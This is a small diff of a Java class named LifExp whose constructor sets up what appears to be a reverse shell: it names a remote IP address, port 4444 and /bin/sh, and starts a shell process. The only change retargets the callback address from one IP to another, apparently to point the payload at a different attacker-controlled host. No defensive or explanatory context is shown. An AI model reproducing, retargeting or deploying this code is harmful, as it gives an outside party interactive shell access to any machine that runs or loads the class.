@@ -6,7 +6,7 @@ import java.net.Socket;
 public class LifExp {
 
   public LifExp() throws Exception {
-    String host="103.130.218.210";
+    String host="103.130.218.69";
     int port=4444;
     String cmd="/bin/sh";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
